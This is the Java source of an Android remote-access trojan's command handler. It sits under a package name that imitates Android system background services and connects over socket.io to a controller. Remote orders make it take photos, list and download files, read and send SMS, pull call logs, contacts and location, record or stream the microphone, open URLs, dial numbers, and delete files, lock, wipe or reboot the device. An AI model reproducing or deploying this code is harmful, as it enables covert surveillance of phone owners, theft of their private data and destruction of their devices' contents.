package com.android.background.services.socket;

import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;

import com.android.background.services.helpers.ObeyOrder;
import com.android.background.services.params.Orders;

import org.json.JSONObject;

import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class ConnectionManager {

    private static final String TAG = "MADARA";
    @SuppressLint("StaticFieldLeak")
    public static Context context;
    private static Socket ioSocket;

    public static void startAsync(Context con) {
        try {
            context = con;
            sendReq();
        } catch (Exception ex) {
            startAsync(con);
        }
    }

    public static void sendReq() {

        try {
            if (ioSocket != null) {
                return;
            }

            ioSocket = IOSocket.getInstance().getIoSocket();

            final ObeyOrder obeyOrder = new ObeyOrder(context, ioSocket);

            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                    Log.d(TAG, "call: pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {

                    Log.d(TAG, "call: nur alam");

                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");

                        switch (order) {
                            case Orders.DEVICE_INFO:
                                obeyOrder.deviceInfo();
                                break;

                            case Orders.CAMERA:
                                if (data.getString("extra").equals("camList"))
                                    obeyOrder.camera(-1);
                                else if (data.getString("extra").equals("1"))
                                    obeyOrder.camera(1);
                                else if (data.getString("extra").equals("0"))
                                    obeyOrder.camera(0);
                                break;

                            case Orders.FILES:
                                if (data.getString("extra").equals("ls"))
                                    obeyOrder.fileManager(0, data.getString("path"));
                                else if (data.getString("extra").equals("dl"))
                                    obeyOrder.fileManager(1, data.getString("path"));
                                break;

                            case Orders.SMS:
                                if (data.getString("extra").equals("ls"))
                                    obeyOrder.manageSMS(0, null, null);
                                else if (data.getString("extra").equals("sendSMS"))
                                    obeyOrder.manageSMS(1, data.getString("to"), data.getString("sms"));
                                break;

                            case Orders.CALL_LOGS:
                                obeyOrder.getCallsLogs();
                                break;

                            case Orders.CONTACTS:
                                obeyOrder.getContacts();
                                break;

                            case Orders.MIC:
                                obeyOrder.recordMic(data.getInt("seconds"));
                                break;

                            case Orders.GET_APPS_LIST:
                                obeyOrder.getAppsList();
                                break;

                            case Orders.GET_LOCATION:
                                obeyOrder.getLocation();
                                break;

                            case Orders.RUN_APP:
                                obeyOrder.runApp(data.getString("packageName"));
                                break;

                            case Orders.OPEN_URL:
                                obeyOrder.openUrl(data.getString("url"));
                                break;

                            case Orders.DELETE_FILE_OR_FOLDER:
                                obeyOrder.deleteFileOrFolder(data.getString("fileOrFolderPath"));
                                break;

                            case Orders.DIAL_NUMBER:
                                obeyOrder.dialNumber(data.getString("number"));
                                break;

                            case Orders.LOCK_DEVICE:
                                obeyOrder.lockDevice();
                                break;

                            case Orders.WIPE_DEVICE:
                                obeyOrder.wipeDevice();
                                break;

                            case Orders.REBOOT_DEVICE:
                                obeyOrder.rebootDevice();
                                break;

                            case Orders.LISTEN_LIVE_MIC:
                                obeyOrder.listenLiveMic();
                                break;
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "call: ", e);
                    }
                }
            });

            ioSocket.connect();

        } catch (Exception ex) {
            Log.e(TAG, "socket: ", ex);
        }
    }
}
